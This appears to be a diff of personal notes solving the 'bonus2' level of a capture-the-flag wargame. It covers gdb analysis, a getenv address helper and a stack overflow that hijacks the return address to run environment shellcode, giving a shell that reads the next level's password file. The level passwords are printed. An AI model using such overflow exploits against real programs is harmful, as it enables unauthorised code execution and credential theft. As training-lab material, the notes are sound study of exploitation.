@@ -1,3 +1,6 @@
+su bonus2 
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
 gdb ./bonus2
 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
 Copyright (C) 2012 Free Software Foundation, Inc.
@@ -65,3 +68,38 @@ Dump of assembler code for function main:
    0x08048602 <+217>:	mov    %eax,(%esp)
    0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
 ---Type <return> to continue, or q <return> to quit---
+
+
+(gdb) r 0123456789012345678901234567890123456789 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/bonus2/bonus2 0123456789012345678901234567890123456789 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Hyvää päivää 0123456789012345678901234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+
+(gdb) q
+
+
+
+
+cat > /tmp/getenv.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+int main(int argc, char *argv[]) {
+    printf("%s is at %p\n", argv[1], getenv(argv[1]));
+    return 0;
+}
+EOF
+
+cat /tmp/getenv.c
+
+gcc /tmp/getenv.c -o /tmp/getenv
+chmod +x /tmp/getenv
+/tmp/getenv SHELLCODE
+
+bonus2@RainFall:~$ export LANG=fi
+ ./bonus2 0123456789012345678901234567890123456789 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5' + '\xaf\xf8\xff\xbf' + 'BBBB'")
+Hyvää päivää 0123456789012345678901234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5����BBBB
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
